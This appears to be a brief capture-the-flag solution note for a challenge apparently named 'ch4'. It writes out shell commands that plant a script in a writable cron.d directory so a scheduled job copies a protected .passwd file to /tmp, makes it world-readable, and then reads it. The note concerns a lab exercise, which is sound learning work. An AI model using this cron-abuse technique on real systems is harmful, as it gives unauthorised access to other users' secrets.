1) create the script for show password
cat <<EOF > cron.d/script.sh

#!/bin/bash
/bin/cat /challenge/app-script/ch4/.passwd > /tmp/passwd
chmod 777 /tmp/passwd

EOF

chmod o+rx cron.d/script.sh

2) wait 1 minute and show password

cat /tmp/passwd
